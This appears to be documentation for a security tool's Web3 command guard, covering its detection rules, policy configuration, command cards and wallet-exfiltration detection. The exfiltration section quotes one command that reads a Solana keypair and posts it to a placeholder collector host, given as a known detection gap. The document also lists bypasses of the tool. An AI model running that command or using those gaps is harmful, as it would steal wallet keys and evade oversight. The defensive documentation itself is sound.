# Web3 command guard

The Web3 command guard reads a Cast, Forge, Hardhat, Solana, or Anchor
invocation as a *grammar*, decides what it would DO, and compares that against a
trusted policy. It is a preflight control over the command you are about to run.

It is not chain analysis. Nothing here reads chain state, simulates a
transaction, resolves an ENS name, scores an address, inspects a contract, or
watches a mempool. An address is a string the guard deliberately keeps out of
its own output.

## What it decides

The parser lives in `crates/tirith-core/src/rules/web3/` and emits typed facts:
the tool family, the operation, the write mode, the signers with their roles,
the RPC reference, safety flags, destinations, and an explicit list of the gaps
it could not resolve. `crates/tirith-core/src/rules/web3_gate.rs` turns those
facts into findings.

Three rule ids, and only three:

| Rule | Fires when | Severity |
|---|---|---|
| `web3_state_changing_command` | the operation writes on-chain | Medium, or High when the same command also disables a declared safety control |
| `web3_signer_risk` | of the signer the command uses | Critical for literal raw key, keypair, or mnemonic material in argv; High for an unlocked node or an interactive prompt |
| `web3_network_policy_violation` | the operation contradicts the trusted `web3_guard` | High for a denied endpoint or an impermissible signer; the unclassified-endpoint case follows the policy's own action |

Bare private-key fragments stay out of the hot path because the credential and
exfiltration rules already cover them in their own contexts.

**A parser gap produces no finding on the engine surfaces.** There is no fourth
rule id, and `analysis_incomplete` is not reused here either: `web3_gate::check`
iterates only the commands the grammar recognized
(`crates/tirith-core/src/rules/web3_gate.rs:37-45`) and never reads the parse
result's gaps, while the only emitters of `analysis_incomplete` live in
`crates/tirith-core/src/repo_hooks.rs`. So `forge create`, which has no grammar
arm, returns a clean `allow` with zero findings from `tirith check`, the shell
hook, `tirith_check_command`, and the gateway. The gap IS recorded in the parse
result and `tirith task check` reports it as `"complete": false`, but silence on
an engine surface must not be read as "nothing to see".

### The severity ladder, and why it stops where it does

A plain on-chain write is Medium. That is the tool doing its job. It rises to
High only when the same command ALSO switches off a check the operator declared:
`--skip-simulation`, `--skip-preflight`, or `--force`. That is the shape that
turns a mistake into an unrecoverable one.

Literal signer material in argv is Critical, because it is readable from the
process table, from shell history, and from any log that captured the command.
The key is compromised the moment it is typed, and no policy setting changes
that.

An operation explicitly aimed at `devnet`, `testnet`, `localhost`, `localnet`,
`local`, or a loopback endpoint produces **no** state-change finding. Deploying
to devnet is routine developer activity that happens many times a day, and a
control that interrupts it is a control operators learn to ignore. The signer
rules still apply: a raw key is exactly as exposed on devnet as on mainnet.

The match is an exact alias list, not a substring test, so `devnet` matches
while an attacker-supplied `my-devnet-proxy.example` does not.

## Evidence is categorical

A Web3 finding names the tool, the operation, and the signer KIND. It never
carries a key, a keystore path, a destination address, or the raw command:

```
tirith:v1:web3_operation;tool=cast;operation=send;write=state_changing;safety_bypass=no
tirith:v1:web3_signer;tool=cast;kind=raw_private_key;role=default
tirith:v1:web3_policy;tool=cast;status=denied_endpoint
```

Every field is a closed vocabulary token, mapped explicitly rather than derived
from Rust's `Debug` formatting, so renaming a variant cannot silently change
evidence that other tooling parses.

## Configuring `web3_guard`

The section lives in the policy file. Defaults are observational: no networks,
no signers, no denials, and every action at `warn`. **With no trusted networks
declared, the unclassified-endpoint path does not fire at all**, so an
unconfigured installation gets no `web3_network_policy_violation` from this
section.

That is a statement about this section only. The detection rules above are NOT
gated on configuration: on an unconfigured installation
`web3_state_changing_command` fires at Medium (action `warn`), and
`web3_signer_risk` fires at Critical (action `block`) for raw key or mnemonic
material in argv. Only `web3_network_policy_violation` needs configuration to
fire at all. See
[what changes on upgrade](../web3-task-rollout.md#what-is-on-by-default).

```yaml
# ~/.config/tirith/policy.yaml  (user scope) or the org policy root.
# A repository-scoped .tirith/policy.yaml CANNOT declare any of the
# grant-bearing keys below; see "A repository may tighten, never authorize".
web3_guard:
  networks:
    - name: ethereum-mainnet
      family: evm
      identity:
        evm_chain_id: 1        # or: solana_cluster + solana_genesis
      endpoints:
        - scheme: https
          host: eth-mainnet.example-rpc.invalid
          subdomains: exact_host
  allowed_signers: [hardware_wallet, keystore_file]
  deny_rpc:
    - scheme: https
      host: rpc.untrusted.invalid
      subdomains: host_and_subdomains
  action_unclassified_rpc: warn
  # Accepted and validated, but INERT today. See "Declared but not yet wired".
  deny_destinations: ["0x0000000000000000000000000000000000000000"]
  require_command_card: false
  action_incomplete_analysis: warn
  action_ambiguous_hardhat_production_run: warn
```

Field notes that matter more than the shape:

- **There is no free-form regex and no URL-string allowlist.** An endpoint is a
  structured matcher with a scheme, host, optional port, optional path prefix,
  and an explicit `subdomains` decision that defaults to `exact_host`. This is
  where endpoint policies usually fail: `https://rpc.example` as a *pattern*
  happily matches `https://rpc.example.attacker.tld`. Fixed fields cannot
  express that mistake.
- **Networks are keyed on real chain identity** (an EVM chain id, or a Solana
  cluster plus genesis hash), so a fork cannot pose as mainnet by reusing a
  name.
- **Raw and environment-bearing signer kinds are not expressible.**
  `allowed_signers` accepts only `hardware_wallet`, `keystore_file`,
  `keypair_file`, `account_alias`, and `unlocked_node`. A policy that could
  allowlist a raw private key would legitimize pasting a key into argv, which is
  the exact practice this guard detects. Those spellings are rejected rather
  than silently dropped, so you cannot believe you allowed something you did
  not.
- **`action_unclassified_rpc` is not a hostility verdict.** An endpoint no
  trusted network claims is reported with the words "this is not a claim that
  the host is malicious; it means the policy cannot vouch for it". If a
  legitimate endpoint is being reported, add it to the network's endpoints
  rather than suppressing the rule.

### Declared but not yet wired

Six of the fields in that block are parsed, bounds-checked, merged with the
repo-scope directions below, and printed by `tirith policy effective`, but no
rule consults them. `rules::web3_gate` is the only consumer of
`policy.web3_guard` (`crates/tirith-core/src/engine.rs:3072`) and it reads
exactly five things: `denies_rpc` (`web3_gate.rs:299`), `classify_rpc`
(`:300`), `networks` (`:315`), `action_unclassified_rpc` (`:316`), and
`permits_signer` (`:352`).

| Field | Status today |
|---|---|
| `deny_destinations` | inert; `web3_policy.rs` exposes no destination lookup at all |
| `require_command_card` | inert; nothing requires or checks a card, and the CLI cannot author a Web3 card |
| `command_card_key_ids` | inert beyond a `policy validate` non-empty check |
| `selector_aliases` | inert; no rule resolves a selector alias |
| `action_incomplete_analysis` | inert HERE; only the `task_gate` copy is read (`task_boundary.rs:325`) |
| `action_ambiguous_hardhat_production_run` | inert; no production reader anywhere |

`tirith policy validate` reports such a policy as `"valid": true` with zero
issues, so validation is not the place you will find this out. Setting
`deny_destinations` to the zero address and `require_command_card: true` leaves
`cast send 0x0000000000000000000000000000000000000000 --value 1ether --rpc-url <endpoint> --keystore <path>`
at exactly one `web3_state_changing_command` MEDIUM, action `warn`. Setting both
inert actions to `block` leaves
`npx hardhat run scripts/deploy.js --network mainnet` at `allow` with zero
findings.

Do not stand down a manual review on the strength of these fields. Wiring them
to a rule is a behaviour change and therefore a future slice, not a
documentation slice.

### A repository may tighten, never authorize

A checked-in `.tirith/policy.yaml` is attacker-controlled in exactly the threat
model this guard exists for. So the repo merge is not a field-wise overwrite;
each field carries a direction:

| Field kind | Repo-scope behaviour |
|---|---|
| `networks`, `selector_aliases`, `allowed_signers`, `command_card_key_ids` | **RESET.** Their presence is authorization, so a repo value is dropped entirely. |
| `deny_rpc`, `deny_destinations` | **UNION.** More denial is strictly safer. |
| `action_*`, `require_command_card` | **STRICTER wins** on a total lattice. |

These directions describe the MERGE, and the merge is real and tested for every
row. They do not imply the merged value is then acted on: of the fields named
here, only `networks`, `allowed_signers`, `deny_rpc`, and
`action_unclassified_rpc` reach a rule. The rest merge correctly into a value
nothing reads. See "Declared but not yet wired" above.

A property test proves the resulting effect set is always a subset of the
trusted one, across every provenance and trust combination, and that the merge
is idempotent.

`tirith policy effective` prints which repo keys were neutralized, so a
contributor who wrote a network into the repo policy can see that it was
dropped rather than wondering why it had no effect.

## Command cards for Web3 operations

**Not a control you can turn on today.** This section describes a data structure
that ships with no caller and no authoring surface. It is documented so that
nobody configures `require_command_card` believing an approval step now exists.

A command card is an operator-authored, ed25519-signed attestation that a known
command is what it claims. Schema 2 adds Web3 bindings: the named network, the
family, the chain or genesis identity, the signer KIND, destinations, artifact
hashes, the policy identity, the ordered operation set, and the authorized
approval key.

What is missing is everything that would make it act:

- **No surface compares a card's Web3 bindings against an observed command.**
  `Card::approves_web3` (`crates/tirith-core/src/command_card.rs:518`),
  `Web3CardBindings` (`:157`), and `CARD_SCHEMA_V2` (`:146`) have zero
  references outside `command_card.rs` and its own unit tests.
- **The engine's card path is v1 only.** `engine.rs:1754` calls
  `command_card::evaluate_card`, which at `command_card.rs:868-888` does
  signature and expiry verification plus `card.command_matches(cmd)` string
  equality, and nothing Web3-aware.
- **The CLI cannot author one.** `tirith command-card create` exposes only
  `--command`, `--expected-domain`, `--script-sha256`, `--writes`,
  `--requires-sudo`, and `--expires`. There is no flag for a network, a signer
  kind, a destination, or an operation set.
- **`require_command_card` is inert**, as recorded above.

Three properties of the unreachable routine are structural rather than advisory,
and are stated here for the reader of the code:

1. **A card may never bind raw signer material.** `raw_private_key`,
   `raw_keypair`, `mnemonic`, `stdin`, `prompt`, and `unknown` are refused at
   construction and again at verification. A card is checked into a repository;
   binding a key would publish it.
2. **A v1 card can never approve a Web3 operation.** It attests to a command
   string and nothing about network, signer, or destination, so honoring it
   would let an old card bless an operation nobody reviewed. `approves_web3`
   returns `V1CannotApproveWeb3`.
3. **Operation comparison is ordered-set equality, not subset.** A card
   approving one deployment would not silently approve a second appended to the
   same command line.

Wiring a card check into a surface, and adding the flags to author one, is a
behaviour change and therefore a future slice, not a documentation slice.

Destinations are bound literally rather than hashed, because a card is an
operator-authored artifact meant to be reviewed by a human and an address is
public data. That is a different trust context from the automatic findings
above, where addresses stay out of the output deliberately.

Compatibility: both schema-2 fields are omitted from the JSON unless set, so a
v1 card's signing bytes are byte-identical to what they were before this release
and every checked-in v1 signature still verifies. A test pins the v1 payload to
an exact literal rather than to a round-trip, because a round-trip would still
pass if both sides changed together.

## Wallet material and exfiltration

The shared catalogue in `crates/tirith-core/src/sensitive_assets.rs` recognises
reviewed wallet paths, keystore documents, browser-wallet storage roots,
desktop-wallet files, Solana keypair arrays, BIP-39 mnemonics (with real
checksum arithmetic, not a word count), EVM private scalars, and hosted RPC
credentials, with target-explicit POSIX, macOS, and Windows path semantics.

Recognition feeds two things. First, **mandatory redaction**: a recognised
secret value, and separately a recognised private PATH, are removed from every
public and durable surface, including CLI evidence, the audit log,
`last_trigger.json`, SARIF, MCP responses, and the webhook payload. A path is
not a secret byte string, so value-based redaction cannot see it, which is why
the two are separate mechanisms.

Second, **source-to-sink correlation**. A proven read of a reviewed source
flowing to a proven remote sink is `data_exfiltration`. A source-only read is
not: `cat ~/.config/solana/id.json` on its own is an allow with zero findings,
because a security tool that fires on reading your own wallet file is a security
tool you turn off.

Staging is modelled across ordered same-command segments, including archive,
base64, hex, single-file compressor (`gzip -c`, `xz -c`, `zstd -c`), and
encryptor (`openssl enc -out`, `gpg -o`, `age -o`) hops, plus operand promotion
through `xargs`, `find -exec`, and GNU `parallel :::`. Provenance is invalidated
on a proven overwrite, truncate, or delete, and on branch or background
ambiguity.

**A known gap, stated rather than left to be found.** A producer inside a nested
shell body with the sink outside it escapes:

```
bash -c "cat ~/.config/solana/id.json" | curl --data-binary @- https://collector.invalid/upload
```

is a confident allow at this release. The nested body is analyzed, so the same
chain entirely inside `-c` blocks, and the same chain entirely outside `-c`
blocks; what is missing is propagation of the inner body's read provenance into
the outer pipeline. Related unprobed shapes are `xargs -a <file>`,
`parallel -a <file>`, and `while read` loops. See
[enforcement coverage](../enforcement-coverage.md) for the full ledger.

## What stops a command

Findings are a preflight decision. What turns a decision into a refusal is
separate, and narrower:

- an interactive shell hook in a blocking mode refuses to run the line;
- the MCP gateway refuses to forward the call;
- a tirith-owned transition (`pkg approve`, `pkg install`, `install`, `run`,
  `install url`, a tirith config write, the capsule preset) refuses before its
  own irreversible step.

A non-interactive shell, a direct `exec`, a program linking `tirith-core` as a
library, and an agent that never loaded the hook are not covered. `TIRITH=0`
bypasses unless `allow_bypass_env: false` is set, and a root user bypasses
trivially.

## See also

- [Enforcement coverage](../enforcement-coverage.md), the per-capability ledger
- [Task envelope](../task-envelope.md), the untrusted-task side of the boundary
- [Threat model](../threat-model.md), the non-goals this guard operates inside
- [Cookbook](../cookbook.md), worked `web3_guard` policy recipes
